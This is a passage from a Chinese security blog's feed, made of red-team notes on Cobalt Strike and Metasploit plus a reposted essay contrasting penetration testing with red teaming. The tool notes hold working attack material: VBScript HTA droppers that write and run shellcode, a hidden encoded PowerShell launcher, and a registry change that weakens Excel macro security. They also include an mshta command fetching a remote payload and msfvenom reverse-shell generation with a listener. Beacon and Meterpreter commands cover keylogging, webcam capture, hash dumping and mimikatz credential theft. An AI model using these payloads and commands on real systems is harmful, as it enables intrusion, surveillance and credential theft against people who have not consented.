class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;VBScript&quot;</span>&gt;</span></span><br><span class="line">    Function var_func()</span><br><span class="line">        var_shellcode = &quot;4d5a90000300000004000000ffff0000b8000......&quot;</span><br><span class="line"></span><br><span class="line">        Dim var_obj</span><br><span class="line">        Set var_obj = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">        Dim var_stream</span><br><span class="line">        Dim var_tempdir</span><br><span class="line">        Dim var_tempexe</span><br><span class="line">        Dim var_basedir</span><br><span class="line">        Set var_tempdir = var_obj.GetSpecialFolder(2)</span><br><span class="line">        var_basedir = var_tempdir &amp; &quot;\&quot; &amp; var_obj.GetTempName()</span><br><span class="line">        var_obj.CreateFolder(var_basedir)</span><br><span class="line">        var_tempexe = var_basedir &amp; &quot;\&quot; &amp; &quot;evil.exe&quot;</span><br><span class="line">        Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)</span><br><span class="line">        For i = 1 to Len(var_shellcode) Step 2</span><br><span class="line">            var_stream.Write Chr(CLng(&quot;&amp;H&quot; &amp; Mid(var_shellcode,i,2)))</span><br><span class="line">        Next</span><br><span class="line">        var_stream.Close</span><br><span class="line">        Dim var_shell</span><br><span class="line">        Set var_shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">        var_shell.run var_tempexe, 0, true</span><br><span class="line">        var_obj.DeleteFile(var_tempexe)</span><br><span class="line">        var_obj.DeleteFolder(var_basedir)</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    var_func</span><br><span class="line">    self.close</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>PowerShell 也是 VBScript 脚本不过 Wscript.Shell 运行的是 PowerShell 程序，其执行的内容经过 Base64 编码。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;VBScript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Function</span> <span class="title function_">var_func</span>()</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Dim</span> var_shell</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Set</span> var_shell = <span class="title class_">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">        var_shell.<span class="property">run</span> <span class="string">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAG......MAdAAgAEkAoACkAOwA=&quot;</span>, <span class="number">0</span>, <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">End</span> <span class="title class_">Function</span></span></span><br><span class="line"><span class="language-javascript">    var_func</span></span><br><span class="line"><span class="language-javascript">    self.<span class="property">close</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>VBS 将执行 Excel 宏上线。过程是修改注册表信任 Excel 宏，并执行宏，最后恢复注册表。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;vbscript&quot;</span>&gt;</span></span><br><span class="line">Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule</span><br><span class="line"></span><br><span class="line">Set objExcel = CreateObject(&quot;Excel.Application&quot;)</span><br><span class="line">objExcel.Visible = False</span><br><span class="line"></span><br><span class="line">Set WshShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line"></span><br><span class="line">function RegExists(regKey)</span><br><span class="line">    on error resume next</span><br><span class="line">    WshShell.RegRead regKey</span><br><span class="line">    RegExists = (Err.number = 0)</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">&#x27; Get the old AccessVBOM value</span><br><span class="line">RegPath = &quot;HKEY_CURRENT_USER\Software\Microsoft\Office\&quot; &amp; objExcel.Version &amp; &quot;\Excel\Security\AccessVBOM&quot;</span><br><span class="line"></span><br><span class="line">if RegExists(RegPath) then</span><br><span class="line">    action = WshShell.RegRead(RegPath)</span><br><span class="line">else</span><br><span class="line">    action = &quot;&quot;</span><br><span class="line">end if</span><br><span class="line"></span><br><span class="line">&#x27; Weaken the target</span><br><span class="line">WshShell.RegWrite RegPath, 1, &quot;REG_DWORD&quot;</span><br><span class="line"></span><br><span class="line">&#x27; Run the macro</span><br><span class="line">Set objWorkbook = objExcel.Workbooks.Add()</span><br><span class="line">Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)</span><br><span class="line">xlmodule.CodeModule.AddFromString &quot;Private &quot;......&quot;</span><br><span class="line">objExcel.DisplayAlerts = False</span><br><span class="line">on error resume next</span><br><span class="line">objExcel.Run &quot;Auto_Open&quot;</span><br><span class="line">objWorkbook.Close False</span><br><span class="line">objExcel.Quit</span><br><span class="line"></span><br><span class="line">&#x27; Restore the registry to its old state</span><br><span class="line">if action = &quot;&quot; then</span><br><span class="line">    WshShell.RegDelete RegPath</span><br><span class="line">else</span><br><span class="line">    WshShell.RegWrite RegPath, action, &quot;REG_DWORD&quot;</span><br><span class="line">end if</span><br><span class="line">self.close</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>执行上线很简单，使用 mshta 执行 .hta 文件即可。</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mshta http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">102</span>:<span class="number">80</span>/download/file.ext</span><br></pre></td></tr></table></figure><h3 id="MS-Office-Macro–待学习"><a href="#MS-Office-Macro–待学习" class="headerlink" title="MS Office Macro–待学习"></a>MS Office Macro–待学习</h3><p>微软 Office Word，Excel，PowerPoint 常说宏都是用 VBA（Visual Basic for Application）编写的，这个宏的作用是可以访问部分 Windows API 模拟键盘、鼠标等操作。</p><h3 id="Payload-Gennerator"><a href="#Payload-Gennerator" class="headerlink" title="Payload Gennerator"></a>Payload Gennerator</h3><p>生成原始 Payload用来当作免杀的原材料。</p><h3 id="Windows-Executable-x2F-Executable-S"><a href="#Windows-Executable-x2F-Executable-S" class="headerlink" title="Windows Executable&#x2F;Executable (S)"></a>Windows Executable&#x2F;Executable (S)</h3><h2 id="Web-Drive-by（钓鱼攻击）"><a href="#Web-Drive-by（钓鱼攻击）" class="headerlink" title="Web Drive-by（钓鱼攻击）"></a>Web Drive-by（钓鱼攻击）</h2><h3 id="System-Profier"><a href="#System-Profier" class="headerlink" title="System Profier"></a>System Profier</h3><p>系统侦察<code>System Profiler</code>是一个方便客户端攻击的侦察工具，这个工具将会在CS服务端上启动一个Web服务，这样当目标访问这个Web服务的时候，我们就能够看到目标使用的浏览器、操作系统等等指纹信息。</p><p><img src="/../images/image-20231011233039941.png" alt="image-20231011233039941"></p><p>访问server的<code>/baidu</code>会重定向到百度，获得到的指纹可以在以下查看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、View --&gt; Applications</span><br><span class="line">2、View --&gt; Web Log</span><br><span class="line">3、Cobalt Strike --&gt; Visualization --&gt; Target Table</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231011233209117.png" alt="image-20231011233209117"></p><p>值得注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。</p><h3 id="Clone-site（克隆网站）"><a href="#Clone-site（克隆网站）" class="headerlink" title="Clone site（克隆网站）"></a>Clone site（克隆网站）</h3><p><img src="/../images/image-20231011234547914.png" alt="image-20231011234547914"></p><ul><li>Log keystrokes on cloned site：获取目标的键盘记录，在WebLog中可以查看</li></ul><p><img src="/../images/image-20231011234520222.png" alt="image-20231011234520222"></p><p>克隆效果</p><p><img src="/../images/image-20231011234648231.png" alt="image-20231011234648231"></p><h3 id="HostFile"><a href="#HostFile" class="headerlink" title="HostFile"></a>HostFile</h3><p>作用相当于用http.server起了一个web服务，将文件上传到CS服务端上提供远程文件下载</p><p><img src="/../images/image-20231011234004732.png" alt="image-20231011234004732"></p><h3 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h3><p>用来管理上述功能使用时创建的Web 站点</p><p><img src="/../images/image-20231011234837927.png" alt="image-20231011234837927"></p><h3 id="邮件钓鱼"><a href="#邮件钓鱼" class="headerlink" title="邮件钓鱼"></a>邮件钓鱼</h3><h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><h2 id="Beacon-管理"><a href="#Beacon-管理" class="headerlink" title="Beacon 管理"></a>Beacon 管理</h2><p>在 Beacon 会话上右击 <code>interact</code>（交互）即可打开 Beacon 控制台</p><p><strong>Beacon 菜单</strong></p><p>Access：包含了一些对凭据的操作及提权的选项</p><p>Explore：包含了信息探测与目标交互的选项</p><p>Pivoting：包含了一些设置代理隧道的选项</p><p>Session：包含了对当前 Beacon 会话管理的选项</p><p><strong>Beacon 命令</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Beacon Commands</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line"> Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    argue                     进程参数欺骗</span><br><span class="line">    blockdlls                 阻止子进程加载非Microsoft DLL</span><br><span class="line">    browserpivot              注入受害者浏览器进程</span><br><span class="line">    bypassuac                 绕过UAC提升权限</span><br><span class="line">    cancel                    取消正在进行的下载</span><br><span class="line">    <span class="built_in">cd</span>                        切换目录</span><br><span class="line">    checkin                   强制让被控端回连一次</span><br><span class="line">    clear                     清除beacon内部的任务队列</span><br><span class="line">    connect                   Connect to a Beacon peer over TCP</span><br><span class="line">    covertvpn                 部署Covert VPN客户端</span><br><span class="line">    <span class="built_in">cp</span>                        复制文件</span><br><span class="line">    dcsync                    从DC中提取密码哈希</span><br><span class="line">    desktop                   远程桌面(VNC)</span><br><span class="line">    dllinject                 反射DLL注入进程</span><br><span class="line">    dllload                   使用LoadLibrary将DLL加载到进程中</span><br><span class="line">    download                  下载文件</span><br><span class="line">    downloads                 列出正在进行的文件下载</span><br><span class="line">    drives                    列出目标盘符</span><br><span class="line">    elevate                   使用exp</span><br><span class="line">    execute                   在目标上执行程序(无输出)</span><br><span class="line">    execute-assembly          在目标上内存中执行本地.NET程序</span><br><span class="line">    <span class="built_in">exit</span>                      终止beacon会话</span><br><span class="line">    getprivs                  Enable system privileges on current token</span><br><span class="line">    getsystem                 尝试获取SYSTEM权限</span><br><span class="line">    getuid                    获取用户ID</span><br><span class="line">    hashdump                  转储密码哈希值</span><br><span class="line">    <span class="built_in">help</span>                      帮助</span><br><span class="line">    inject                    在注入进程生成会话</span><br><span class="line">    jobkill                   结束一个后台任务</span><br><span class="line">    <span class="built_in">jobs</span>                      列出后台任务</span><br><span class="line">    kerberos_ccache_use       从ccache文件中导入票据应用于此会话</span><br><span class="line">    kerberos_ticket_purge     清除当前会话的票据</span><br><span class="line">    kerberos_ticket_use       Apply 从ticket文件中导入票据应用于此会话</span><br><span class="line">    keylogger                 键盘记录</span><br><span class="line">    <span class="built_in">kill</span>                      结束进程</span><br><span class="line">    <span class="built_in">link</span>                      Connect to a Beacon peer over a named pipe</span><br><span class="line">    logonpasswords            使用mimikatz转储凭据和哈希值</span><br><span class="line">    <span class="built_in">ls</span>                        列出文件</span><br><span class="line">    make_token                创建令牌以传递凭据</span><br><span class="line">    mimikatz                  运行mimikatz</span><br><span class="line">    <span class="built_in">mkdir</span>                     创建一个目录</span><br><span class="line">    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line">    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode http                 使用HTTP作为通信通道</span><br><span class="line">    <span class="built_in">mv</span>                        移动文件</span><br><span class="line">    net                       net命令</span><br><span class="line">    note                      备注       </span><br><span class="line">    portscan                  进行端口扫描</span><br><span class="line">    powerpick                 通过Unmanaged PowerShell执行命令</span><br><span class="line">    powershell                通过powershell.exe执行命令</span><br><span class="line">    powershell-import         导入powershell脚本</span><br><span class="line">    ppid                      Set parent PID <span class="keyword">for</span> spawned post-ex <span class="built_in">jobs</span></span><br><span class="line">    ps                        显示进程列表</span><br><span class="line">    psexec                    Use a service to spawn a session on a host</span><br><span class="line">    psexec_psh                Use PowerShell to spawn a session on a host</span><br><span class="line">    psinject                  在特定进程中执行PowerShell命令</span><br><span class="line">    pth                       使用Mimikatz进行传递哈希</span><br><span class="line">    <span class="built_in">pwd</span>                       当前目录位置</span><br><span class="line">    reg                       Query the registry</span><br><span class="line">    rev2self                  恢复原始令牌</span><br><span class="line">    <span class="built_in">rm</span>                        删除文件或文件夹</span><br><span class="line">    rportfwd                  端口转发</span><br><span class="line">    run                       在目标上执行程序(返回输出)</span><br><span class="line">    runas                     以其他用户权限执行程序</span><br><span class="line">    runasadmin                在高权限下执行程序</span><br><span class="line">    runu                      Execute a program under another PID</span><br><span class="line">    screenshot                屏幕截图</span><br><span class="line">    setenv                    设置环境变量</span><br><span class="line">    shell                     执行cmd命令</span><br><span class="line">    shinject                  将shellcode注入进程</span><br><span class="line">    shspawn                   启动一个进程并将shellcode注入其中</span><br><span class="line">    <span class="built_in">sleep</span>                     设置睡眠延迟时间</span><br><span class="line">    socks                     启动SOCKS4代理</span><br><span class="line">    socks stop                停止SOCKS4</span><br><span class="line">    spawn                     Spawn a session </span><br><span class="line">    spawnas                   Spawn a session as another user</span><br><span class="line">    spawnto                   Set executable to spawn processes into</span><br><span class="line">    spawnu                    Spawn a session under another PID</span><br><span class="line">    ssh                       使用ssh连接远程主机</span><br><span class="line">    ssh-key                   使用密钥连接远程主机</span><br><span class="line">    steal_token               从进程中窃取令牌</span><br><span class="line">    timestomp                 将一个文件的时间戳应用到另一个文件</span><br><span class="line">    <span class="built_in">unlink</span>                    Disconnect from parent Beacon</span><br><span class="line">    upload                    上传文件</span><br><span class="line">    wdigest                   使用mimikatz转储明文凭据</span><br><span class="line">    winrm                     使用WinRM横向渗透</span><br><span class="line">    wmi                       使用WMI横向渗</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果不知道怎么使用这些命令，通过 help 跟上具体命令 <code>help &lt;command&gt;</code>，会输出具体使用说明。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">help</span> <span class="built_in">ls</span></span><br><span class="line">Use: <span class="built_in">ls</span> [folder]</span><br><span class="line"></span><br><span class="line">Lists files <span class="keyword">in</span> a folder</span><br></pre></td></tr></table></figure><p><code>[folder]</code> 是必选的参数 如果遇到尖括号如 <code>&lt;argrument name&gt;</code> 就是可选参数。</p><h2 id="Beacon派生（会话传递）"><a href="#Beacon派生（会话传递）" class="headerlink" title="Beacon派生（会话传递）"></a>Beacon派生（会话传递）</h2><ul><li><p>将当前会话传递至其他CS团队服务器中，直接右击<code>spawn</code>选择要传递的监听器即可。</p></li><li><p>将当前会话传递至MSF中</p><p>CS创建Foreign监听器</p><p><img src="/../images/image-20231014201928307.png" alt="image-20231014201928307"></p><p>MSF</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.111.128</span><br><span class="line"><span class="built_in">set</span> lport 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>CS右键会话派生（spawn）选择刚刚创建好的Foreign监听器</p><p><img src="/../images/image-20231014202406347.png" alt="image-20231014202406347"></p><p>如下成功派生</p><p><img src="/../images/image-20231014202434316.png" alt="image-20231014202434316"></p></li></ul><h1 id="插件增强"><a href="#插件增强" class="headerlink" title="插件增强"></a>插件增强</h1><p><a href="https://github.com/lintstar/LSTAR">GitHub - lintstar&#x2F;LSTAR: LSTAR - CobaltStrike 综合后渗透插件</a> <a href="https://github.com/pandasec888/taowu-cobalt-strike">GitHub - pandasec888&#x2F;taowu-cobalt-strike</a></p><p><a href="https://github.com/pandasec888/taowu-cobalt_strike">pandasec888&#x2F;taowu-cobalt_strike (github.com)</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>作者老版本官方教程中文翻译<a href="https://www.bilibili.com/video/BV16b411i7n5/">https://www.bilibili.com/video/BV16b411i7n5/</a></p><p><a href="https://teamssix.com/201023-192553.html#toc-heading-20">【建议收藏】CS学习笔记合集 | TeamsSix</a></p><p><a href="https://blog.ateam.qianxin.com/post/cobalt-strike-40-shou-ce-fan-yi-2019-nian-12-yue-2-ri-geng-xin-ban-ben/">Cobalt Strike 4.0 手册翻译 (2019年12月2日更新版本) - 奇安信A-TEAM技术博客 (qianxin.com)</a></p><p><a href="https://www.raingray.com/archives/4385.html#C2+%E4%BD%BF%E7%94%A8">Red Team: Infrastructure - raingray Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>转载--渗透测试和红队的区别</title>
      <link href="/2023/07/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E7%BA%A2%E9%98%9F%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2023/07/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E7%BA%A2%E9%98%9F%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文来自孟极实验室，版权归作者所有</p></blockquote><h1 id="谈谈渗透测试和红队的区别"><a href="#谈谈渗透测试和红队的区别" class="headerlink" title="谈谈渗透测试和红队的区别"></a>谈谈渗透测试和红队的区别</h1><p>最近在各种安全相关的资讯或者技术文章中，越来越多的提到渗透测试（渗透 Testing）和红队（Red Team）这个两个词，而且很多地方是把这两个词的意思混为一体，认为是相同的东西。虽然这两者在方法和实施过程中存在一定相似甚至重合的部分，但是渗透测试和红队还是存在一些本质的差异。本文将分别对两者进行定义和描述，方便企业根据自身安全需求选择合适的安全服务，也能以此识别那些打着红队幌子实际干着渗透测试活的安全公司。</p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>渗透测试是对给定的目标系统进行安全测试，找出漏洞或风险的过程。渗透测试工程师会从不同的层面（包括应用层、网络层、系统层甚至物理层）对目标系统进行脆弱性分析，尝试找出尽可能多的漏洞、配置错误或其他安全风险，并尝试对这些找到的漏洞进行组合利用，最终获取到访问关键隐私数据的权限（隐私数据包括用户信息或者商业秘密等）。渗透测试过程中对漏洞的利用一方面能证明漏洞真实存在，另一方面这些漏洞的利用结果也能揭示出目标系统所面临的风险等级。</p><p>渗透测试专注于对给定的系统进行测试，存在明确的测试目标和测试边界。企业会指定测试起始时间和结束时间，测试时长一般为1到2周。测试目标可能是web系统、工业控制网络、内部办公网络等等。各类众测平台上的测试任务本质上就是渗透测试任务，这些任务都会明确测试范围，比如指定web系统域名、指定测试的APP等。</p><p>一般安全企业提供的渗透测试服务通常可以分解成一组针对不同系统的测试任务，如针对web系统的测试任务、针对内部办公网的测试任务、社会工程学测试任务等等。</p><p>渗透测试在评估系统或网络的安全性时，通常会忽略企业里其他运行环境的安全限制。例如，内网渗透测试将从内网中恶意用户（例如恶意员工或被入侵的员工机器）的角度评估企业的网络安全性。测试工程师到达现场后，将会直接将笔记本电脑接入内部办公网络开始进行测试。内网渗透测试会忽略黑客在内网中获得初始落脚点这个步骤(通常是通过钓鱼邮件或其他方式欺骗员工运行恶意程序)，直接从已有内网接入权限开始进行测试。内网测试报告会包含内网中暴露的有漏洞的服务、未打补丁的系统、错误的系统配置、敏感文件共享等等安全问题，但是不会包含黑客最初如何获取内网接入权限这个步骤。</p><p>在渗透测试过程中，企业中负责防护的安全团队一般不会直接参与，为了配合渗透测试，企业有时会关闭某些安全防护软件或禁用安全策略，方便测试工程师找出更多的安全漏洞。</p><p>当整个渗透测试活动结束后，工程师会出具一份渗透测试报告，里面包含所有发现的漏洞列表以及每个漏洞具体的利用步骤和过程，同时会依据漏洞危害给出相应的威胁等级评分。</p><h2 id="红队"><a href="#红队" class="headerlink" title="红队"></a>红队</h2><p>尽管红队测试在有些攻击技术方面类似渗透测试，但不同于渗透测试尽量多找漏洞的目标，红队测试的任务往往是拿下某个特定的业务目标(比如公司某个项目的源代码，公司竞标标书和底价等商业机密，某个高层管理人员的邮箱或个人机等) 。红队要模拟真实世界中的极具目的性且不希望被检测到的恶意攻击者（受竞争对手雇佣的恶意黑客，收集政治、经济和科技情报的境外国家资助的黑客团伙等），红队测试某种程度上可以说是合法的高级持续性威胁(APT)。在这种完全贴近真实攻击的测试活动中，能够测试企业安全防护体系的阻断（prevention）、检测（detection）和响应（response）能力。</p><p>渗透测试中只关注给定目标系统的漏洞，红队测试则完全不一样。红队在测试过程中关注的是如何规划一条攻击路径来达到目的。在整个红队测试过程中不一定要也不一定会发现目标组织的漏洞，只要能达到目的，任何形式的攻击手段都可以使用，包括但不限于web或者操作系统漏洞、社会工程学、物理渗透、攻击上下游合作供应商等。</p><p>在红队测试开始前，除了任务目标外，不会给到红队关于目标企业的任何其他信息。红队需要通过各种渠道去搜集目标的物理位置、公开的网络系统和服务、组织架构以及雇员等信息，然后根据收集的信息制定攻击计划并实施。被测企业并不清楚（或仅有少数人清楚）攻击将于何时发起，将以何种方式进行。红队测试的持续时间一般比渗透测试更长，可以达到4到6周甚至更长（想想看真实APT攻击中长达数月的潜伏和持续渗透）。</p><p>红队在实施攻击时，会尽量隐藏自己的踪迹，另外还会详细记录每个攻击行为的具体实施时间，在整个行动结束后需要与组织中的防御检测部门(即蓝队)的检测响应时间表进行核对，以此来评估防御检测机制的有效性和响应速度，同时检查蓝队在哪些方面存在漏报和响应不及时，帮助蓝队更好的发现防御检测层面的弱点。这一点CS做的很好，可以导出红队的详细操作日志和时间。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>两者并没有哪个更好之说，对于企业来讲，先要搞清楚具体的场景和安全需求，才能确定需要的是渗透测试还是红队测试。对于新上线的业务系统，需要搞清楚存在那些漏洞以及漏洞可能造成的危害时，需要的是渗透测试；如果企业各个子系统都已经进行过渗透测试，并且存在成熟的漏洞管理、防御检测以及应急响应机制，另外还想要对企业整体安全环境进行评估，了解企业在面临真正的安全攻击事件时，是否有能力防御或者检测并及时响应，那么需要的便是红队评估。</p><p>最后说一点，在很多人的认知里面，一个企业被攻破一定是因为存在安全漏洞或者配置错误之类的安全问题，这是不正确的。如果真这么简单，那只要按时打补丁，就能防住所有没有0day的恶意黑客甚至防住APT攻击了。上文已经说过，红队测试过程中不一定会发现安全漏洞，很多时候不需要安全漏洞就能打穿一个企业。而现今的安全市场，很多企业还是以漏洞数量来评定安全服务团队的能力，就导出现了很多安全服务报告硬凑漏洞数量的怪象。在这种大环境下，企业可能反而认为没有发现安全漏洞但打穿了他们的红队安全能力不行，或者认为纯粹是偶然侥幸才能得手。这是一个认知升级的过程，什么时候能不以漏洞数量来评定安全服务能力，才能说真正理解了安全和攻击。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 名词概念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF常用命令</title>
      <link href="/2023/07/11/MSF/"/>
      <url>/2023/07/11/MSF/</url>
      
        <content type="html"><![CDATA[<h1 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a><strong>基本步骤</strong></h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search xxx<span class="comment"># 搜索某个模块</span></span><br><span class="line">use xxx<span class="comment"># 使用某个模块</span></span><br><span class="line">show options<span class="comment"># 查看配置选项</span></span><br><span class="line"><span class="built_in">set</span> payload<span class="comment"># 配置攻击载荷</span></span><br><span class="line">run/exploit<span class="comment"># 执行渗透攻击</span></span><br></pre></td></tr></table></figure><h1 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h1><p>Winodws</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=Kali监听端口 -f exe &gt; msf.exe</span><br><span class="line"></span><br><span class="line">参数选项：</span><br><span class="line">-p指定的payload</span><br><span class="line">-e 编码器，x86/shikata_ga_nai</span><br><span class="line">-i迭代器，对有效载荷的编码次数</span><br><span class="line">-f输出文件的格式,exe、dll、raw</span><br></pre></td></tr></table></figure><p>Linux</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=Kali监听端口 -f elf &gt; msf.elf</span><br><span class="line"><span class="built_in">chmod</span> +x ./msf.elf <span class="comment"># 为木马添加执行权限</span></span><br></pre></td></tr></table></figure><p>MSF监听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp <span class="comment"># 设置的payload要一致，不然连不上</span></span><br><span class="line"><span class="built_in">set</span> LHOST Kali的IP</span><br><span class="line"><span class="built_in">set</span> LPORT Kali监听端口</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h1 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span>、<span class="built_in">ls</span>、<span class="built_in">cd</span></span><br><span class="line">getuid<span class="comment"># 查看当前权限</span></span><br><span class="line">getsystem<span class="comment"># 获得系统管理员权限（要本地管理员权限运行）</span></span><br><span class="line">hashdump<span class="comment"># 抓哈希密码</span></span><br><span class="line">sysinfo<span class="comment"># 查看系统信息</span></span><br><span class="line">idletim     <span class="comment"># 查看目标系统已运行时间</span></span><br><span class="line">route<span class="comment"># 查看目标机完整网络设置</span></span><br><span class="line">shell<span class="comment"># 进入目标机shell，exit退出she</span></span><br><span class="line">background<span class="comment"># 将meterpreter隐藏在后台</span></span><br><span class="line"></span><br><span class="line">upload ./1.txt c:\\1.txt<span class="comment"># 上传文件</span></span><br><span class="line">download c:\1.txt ./<span class="comment"># 下载文件</span></span><br><span class="line">search -f *.txt -d c://<span class="comment"># 搜索文件</span></span><br><span class="line"></span><br><span class="line">keyscan_start<span class="comment"># 启动键盘记录</span></span><br><span class="line">keyscan_stop<span class="comment"># 停止键盘记录</span></span><br><span class="line">keyscan_dump<span class="comment"># 转储键盘记录的内容</span></span><br><span class="line">screenshot<span class="comment"># 抓取截屏</span></span><br><span class="line">webcam_list<span class="comment"># 摄像头列表</span></span><br><span class="line">webcam_snap<span class="comment"># 摄像头拍照</span></span><br><span class="line">webcam_stream<span class="comment"># 抓取视频</span></span><br></pre></td></tr></table></figure><h2 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps | grep <span class="string">&quot;explore&quot;</span></span><br><span class="line">migrate pid <span class="comment"># 将shell迁移到explorer.exe进程中</span></span><br></pre></td></tr></table></figure><h2 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a><strong>会话管理</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">background<span class="comment"># 将当前会话放置后台</span></span><br><span class="line">sessions<span class="comment"># 会话管理</span></span><br><span class="line">sessions -l<span class="comment"># 列出所有会话</span></span><br><span class="line">sessions -K<span class="comment"># 终止所有会话</span></span><br><span class="line">sessions -i <span class="built_in">id</span><span class="comment"># 进入某个会话</span></span><br></pre></td></tr></table></figure><h2 id="会话派生到CS"><a href="#会话派生到CS" class="headerlink" title="会话派生到CS"></a>会话派生到CS</h2><p>CS创建监听器</p><p><img src="/../images/image-20231014203804586.png" alt="image-20231014203804586"></p><p>MSF</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.32.102       </span><br><span class="line"><span class="built_in">set</span> lport 9999               </span><br><span class="line"><span class="built_in">set</span> DisablePayloadHandler True</span><br><span class="line"><span class="built_in">set</span> PrependMigrate True</span><br><span class="line">sessions -l   </span><br><span class="line"><span class="built_in">set</span> session 1 </span><br><span class="line">run     </span><br></pre></td></tr></table></figure><p>没成功，弹了个记事本？？？？</p><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230330143036863-1686283281461.png" alt="image-20230330143036863"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span 